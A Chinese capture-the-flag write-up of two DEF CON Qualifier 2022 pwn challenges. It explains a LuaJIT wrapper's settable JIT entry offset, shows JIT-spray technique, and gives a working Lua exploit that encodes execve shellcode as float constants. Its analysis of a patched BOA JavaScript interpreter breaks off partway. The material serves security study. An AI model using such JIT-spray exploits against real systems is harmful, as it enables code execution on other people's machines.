本文是对 Defcon 资格赛中 Pwn 方向两道题目的复现，分别是 smuggler's cove 以及
constricted。难度相比以往的国内赛要高不少，但是同时也学习到了不少新的知识。以下为这两道题目的分析。
## smuggler's cove
### 漏洞分析
这道题是C语言实现的对[LuaJIT](https://github.com/LuaJIT/LuaJIT)的包装，最关键的地方在它可以对执行 JIT
代码的初始位置进行再设置，代码如下，mcode 代表 JIT 的代码，可以根据 offset 设定其入口位置为任意值。
    int debug_jit(lua_State* L) {
    ...
        if (offset != 0) {
            if (offset >= t->szmcode - 1) {
                return luaL_error(L, "Avast! Offset too large!");
            }
            t->mcode += offset;
            t->szmcode -= offset;
            printf("... yarr let ye apply a secret offset, cargo is now %p ...\n", t->mcode);
        }
    ...
    }
    void init_lua(lua_State* L) {
        lua_pushcfunction(L, debug_jit);
        lua_setglobal(L, "cargo");
    }
这意味着可以跳转到 mcode
内的任何位置并且执行。如果跳转位置不是一条完整的指令，例如操作数，则该位置处的操作数将会被读入为汇编指令。这种利用方法的名称为 JIT Spray，以论文
[SoK: Make JIT-Spray Great
Again](https://www.usenix.org/system/files/conference/woot18/woot18-paper-gawlik.pdf) 里的一个 ActionScript JIT 的例子进行说明，这里有一个 ActionScript
实现的一个长的表达式，计算多个数字异或的结果：
    var y=(
        0x3c909090 ^ 
        0x3c909090 ^ 
        0x3c909090 ^ 
        ...
    }
ActionScript JIT
编译器生成的汇编代码如下第一段指令，虽然这些指令运算了上面的表达式，但如果从第一个偏移量开始执行，就会执行不同的指令，如下第二段指令。由于
ActionScript 的常量完全由攻击者控制，因此可以注入小于或等于三个字节大小的任意汇编指令。第四字节 `0x3C` 的作用是掩盖操作码 `0x35`
所代表的合法操作，并产生一个类似 `nop` 语义的 `cmp al, 0x35` 。它还可以防止指令的再同步。
    0x00: B8 9090903C      mov eax, 0x3c909090
    0x05: 35 9090903C      xor eax, 0x3c909090
    0x0a: 35 9090903C      xor eax, 0x3c909090
    0x01: 90 nop
    0x02: 90 nop
    0x03: 90 nop
    0x04: 3C35 cmp al, 0x35
    0x06: 90 nop
    0x07: 90 nop
    0x08: 90 nop
    0x09: 3C35 cmp al, 0x35
    0x0b: 90 nop
    0x0c: 90 nop
    0x0d: 90 nop
    ...
### mcode中的立即数
使用 JIT Spray 的利用方法，第一步是在 JIT
代码中构造立即数，但是实际调试会发现，赋值时的立即数并没有像预想那样放在指令的操作数里。例如这个例子：
    a = {}
    function b()
    a[0]=0x1234;
    a[1]=0x12345678;
    a[2]=0x123456789012;
    a[3]=1.1;
    end 
    b();
    b();
    cargo(b, 0x0);
    b();
它编译成JIT后的结果如下，可以看到，参数被放到了 xmm 寄存器里。
查看 xmm 的值，发现整数按照浮点数的格式存储，符合 [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754)
标准。
继续尝试所有符合 Rust 语法的立即数放置方式，最终发现，Array
的索引值会成为8字节的立即数，例如构造如下代码，0x1111111111111的浮点数就会成为立即数。
    a = {}
    function b()
    a[0x1111111111111]=0x2222222222222;  
    end 
    b();
    b();
    cargo(b, 0x0);
    b();
### shellcode链构造
在可以稳定构造8字节的立即数后，我们可以在 JIT
代码中布置若干立即数，并在单个立即数中构造汇编代码加上跳转指令，跳转到下一个立即数继续执行。这样可以形成一组实现任意功能的 shellcode
链。其中，跳转指令使用短跳转指令，形式为`\xeb`+`offset-2`。
由于题目获取flag的命令已经提示为 `./dig_up_the_loot x marks the spot`，因此构造的 shellcode 则需要执行
`execve("./dig_up_the_loot",{"./dig_up_the_loot", "x", "marks", "the", "spot",
NULL}, NULL);`，由于短跳转需要最小占据2字节的长度，因此除了跳转指令外，构造的汇编代码不能超过6字节，不足的地方可以用 `nop` 填补。
接下来将8字节汇编数据转成浮点数，其中一共需要20个浮点数才能完整地构造 shellcode 链。[这里是将 shellcode 转为浮点数并生成 rust
代码的脚本](https://github.com/Q1IQ/ctf/blob/master/defcon-qualifier-2022/smugglers_cove/gen_shellcode.py)。
    a = {}
    function b()
    a[1.4957223655503106e-164]=0;
    a[1.495815476778225e-164]=0;
    a[1.495841708495309e-164]=0;
    a[1.4873392666992543e-164]=0;
    a[1.4879738606775951e-164]=0;
    a[1.495841708495309e-164]=0;
    a[1.465296784398639e-164]=0;
    a[1.4888193271265417e-164]=0;
    a[1.495841708495309e-164]=0;
    a[1.4866937687679482e-164]=0;
    a[1.4890362322246634e-164]=0;
    a[1.495841708495309e-164]=0;
    a[1.4875381479693369e-164]=0;
    a[1.497704141875117e-164]=0;
    a[1.4823931673038887e-164]=0;
    a[1.4957894513827388e-164]=0;
    a[1.4957894578518181e-164]=0;
    a[1.4957894449136594e-164]=0;
    a[1.4957894966662944e-164]=0;
    a[2.6348604765033886e-284]=0;
    a[1.4958420697436709e-164]=0;
    end 
    b();
    b();
    cargo(b, 0x6a);
    b();
然而，题目对 exp
代码长度进行了433字节的限制。上面的代码不满足该条件，并且经过计算，在去掉一切非必要的空格换行等字符的条件下最多只能写13个浮点数，也就是
shellcode 链最多只能有13组8字节指令。
    #define MAX_SIZE 433
从指令本身入手进行精简是一种方法，例如使用相同语义字符更少的指令。但是这样能缩减的字符数有限，并且注意到原 shellcode
里最占字符的数据是要执行的命令 `./dig_up_the_loot x marks the spot` 。因此将字符串形式的命令直接写入 exp
代码，并且尝试在 JIT 内通过可用的数据找到存储 exp 代码的内存。于是构造如下代码：
    a = {}
    c = "./dig_up_the_loot x marks the spot"
    function b(s)
    a[1.4957223655503106e-164]=0;
    end 
    b(c);
    b(c);
    cargo(b, 0x6a);
    b(c);
调试发现，运行到 JIT 时实际上全部源码都在可索引的范围内，RBX、RCX 和源码甚至在同一个页里。
开启 ASLR 后，发现源码和 RBX、RCX 的偏移也同样是固定的。
基于以上想法构造如下代码和 shellcode，合并之后只需要9个浮点数。最终的 exp 如下：
    a = {}
    c = "./dig_up_the_loot\x00x\x00marks\x00the\x00spot"
    function b(s)
    a[6.296558090174646e-155]=0;
    a[2.41846297676398e-222]=0;
    a[1.8879529989201158e-193]=0;
    a[1.8879518185292636e-193]=0;
    a[1.8879517130205247e-193]=0;
    a[1.8879517211856508e-193]=0;
    a[1.8879517048553986e-193]=0;
    a[1.8879517701764074e-193]=0;
    a[2.6348604765033886e-284]=0;
    end 
    b(c);
    b(c);
    cargo(b, 0x6a);
    b(c);
## constricted
### 补丁分析
题目基于 [BOA](https://github.com/boa-dev/boa)，一个 Rust 实现的 Javascript
解释器，并且提供了补丁代码。第一步根据依赖的库版本和代码行号对commit进行定位，并且应用补丁。
    git reset --hard 5a9ced380629db85a9fc7dee3ec93bf15c0ff6ed
    patch -p1 `结构的 `Newtype`并实现了它的
`BuiltIn` 特性。`TimeCachedValue` 有两个字段 `expire`和 `data`，`data` 为 `JsObject`
对象，`expire`则为一个`u128`的整数，标记 `data` 的到期时间。针对`TimeCachedValue`的`Trace`方法会根据
`TimeCachedValue` 的到期时间来决定是否对data对象进行mark[1]，被mark的对象不会被垃圾回收算法释放。以上涉及到 BOA
中使用到的垃圾回收库 [rust-gc](https://github.com/Manishearth/rust-gc) ，它使用 [mark-sweep](https://en.wikipedia.org/wiki/Tracing_garbage_collection#Naïve_mark-and-sweep) 算法实现垃圾回收，这种算法为代码中使用到的每一个对象设置一个标志位，在mark阶段，对整个代码的 "根集”
进行树状遍历，将根所指向的每个对象标记为
“活跃”。然后在sweep阶段对内存进行扫描，将所有未被标记为“活跃”的对象进行释放，并清空所有标记，为下一个周期做准备。
    pub(crate) struct TimedCache(OrderedMap);
    pub struct TimeCachedValue {
        expire: u128,
        data: JsObject,
    }
    impl Finalize for TimeCachedValue {}